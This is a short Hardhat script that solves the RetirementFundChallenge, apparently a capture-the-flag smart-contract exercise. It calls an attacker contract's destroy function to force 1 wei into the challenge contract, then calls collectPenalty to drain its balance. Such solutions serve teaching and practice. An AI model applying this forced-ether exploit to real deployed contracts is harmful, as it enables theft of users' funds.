import { ethers } from "hardhat";

const solve = async () => {
  const challengeAddress = "0x89712AD1645d7e11Cf0a59eDfD0a5bFC2eEd84bA";
  const [player] = await ethers.getSigners();

  const challengeContract = await ethers.getContractAt(
    "RetirementFundChallenge",
    challengeAddress
  );

  const RetirementFundAttacker = await ethers.getContractFactory(
    "RetirementFundAttacker",
    player
  );

  // const attackerContract = await RetirementFundAttacker.deploy();
  // await attackerContract.deployed();
  const attackerContract = await RetirementFundAttacker.attach(
    "0x092F49ef08519b8559Cc2a0cbE90AB682225405F"
  );

  let tx = await attackerContract.destroy(challengeContract.address, {
    value: 1,
    gasLimit: 1e6,
  });
  console.log(await tx.wait());

  tx = await challengeContract
    .connect(player)
    .collectPenalty({ gasLimit: 1e6 });
  console.log(await tx.wait());
};

solve().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
